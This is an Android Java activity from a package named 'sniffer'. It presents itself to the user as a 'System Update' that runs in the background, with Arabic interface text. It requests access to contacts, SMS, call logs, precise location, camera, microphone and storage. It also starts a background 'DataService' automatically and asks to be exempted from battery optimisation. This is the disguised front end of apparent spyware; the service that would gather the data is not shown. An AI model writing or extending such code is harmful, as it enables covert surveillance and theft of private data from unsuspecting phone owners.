package com.v8.global.sniffer;

import android.Manifest;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.provider.Settings;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.TextView;
import android.widget.Toast;

import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

public class MainActivity extends AppCompatActivity {
    
    private TextView tvStatus;
    private Button btnPermissions;
    private Button btnStartService;
    
    private String[] permissions = {
        Manifest.permission.READ_CONTACTS,
        Manifest.permission.READ_SMS,
        Manifest.permission.READ_CALL_LOG,
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.CAMERA,
        Manifest.permission.RECORD_AUDIO,
        Manifest.permission.READ_EXTERNAL_STORAGE,
        Manifest.permission.WRITE_EXTERNAL_STORAGE
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        // تصميم بسيط
        LinearLayout layout = new LinearLayout(this);
        layout.setOrientation(LinearLayout.VERTICAL);
        layout.setPadding(50, 100, 50, 50);
        
        tvStatus = new TextView(this);
        tvStatus.setText("⚙️ System Update\n\nالتطبيق يعمل في الخلفية");
        tvStatus.setTextSize(18);
        tvStatus.setPadding(0, 0, 0, 30);
        
        btnPermissions = new Button(this);
        btnPermissions.setText("🔓 إعطاء الصلاحيات");
        btnPermissions.setOnClickListener(v -> requestPermissions());
        
        btnStartService = new Button(this);
        btnStartService.setText("▶️ بدء الخدمة");
        btnStartService.setOnClickListener(v -> {
            startService(new Intent(this, DataService.class));
            Toast.makeText(this, "الخدمة بدأت", Toast.LENGTH_SHORT).show();
        });
        
        layout.addView(tvStatus);
        layout.addView(btnPermissions);
        layout.addView(btnStartService);
        setContentView(layout);
        
        // بدأ الخدمة تلقائياً
        startService(new Intent(this, DataService.class));
        checkPermissions();
    }

    private void checkPermissions() {
        boolean allGranted = true;
        for (String permission : permissions) {
            if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
                allGranted = false;
                break;
            }
        }
        
        if (allGranted) {
            tvStatus.setText("✅ جميع الصلاحيات مفعلة\nالخدمة تعمل في الخلفية");
            btnPermissions.setEnabled(false);
        } else {
            tvStatus.setText("⚠️ بعض الصلاحيات غير مفعلة\nالرجاء إعطاء الصلاحيات");
        }
    }

    private void requestPermissions() {
        for (String permission : permissions) {
            if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
                ActivityCompat.requestPermissions(this, new String[]{permission}, 100);
            }
        }
        
        // طلب تجاهل البطارية
        Intent intent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
        intent.setData(android.net.Uri.parse("package:" + getPackageName()));
        startActivity(intent);
        
        Toast.makeText(this, "جاري فتح إعدادات الصلاحيات", Toast.LENGTH_LONG).show();
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        checkPermissions();
    }
    
    @Override
    protected void onResume() {
        super.onResume();
        checkPermissions();
    }
}
